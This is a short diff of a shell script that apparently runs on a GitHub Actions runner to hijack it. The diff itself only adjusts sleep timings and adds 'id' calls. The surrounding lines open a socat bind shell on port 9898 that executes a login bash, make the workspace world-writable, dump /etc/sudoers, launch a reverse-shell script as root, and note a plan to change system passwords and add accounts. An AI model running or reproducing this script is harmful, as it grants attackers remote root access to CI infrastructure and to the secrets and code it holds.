@@ -28,7 +28,7 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&
 )||( echo non_pil;$s1)"
 
 
-sleep 361;
+
 
 
 sudo touch /bin/edge;
@@ -41,7 +41,7 @@ sudo chmod 0777 -R $GITHUB_WORKSPACE/;
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 fi
 
-
+sleep 120;
 
 
 sudo bash -c ' mkdir /tmp/{A,aB};
@@ -51,6 +51,7 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt
 '
 
 
+id;sleep 121;
 
 
 
@@ -79,12 +80,14 @@ grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9_sudo.txt
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 export HOME=/tmp;
+id;sleep 122;
 sudo -H su -l -c /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
 )
 
 # 无条件执行 
 . $GITHUB_WORKSPACE/cs45.sh  &
 
+id;sleep 124;
 
 #修改系统密码 添加系统账户tee chisel-60080  ttyd.x64
 grep -q "tee" /etc/passwd ||
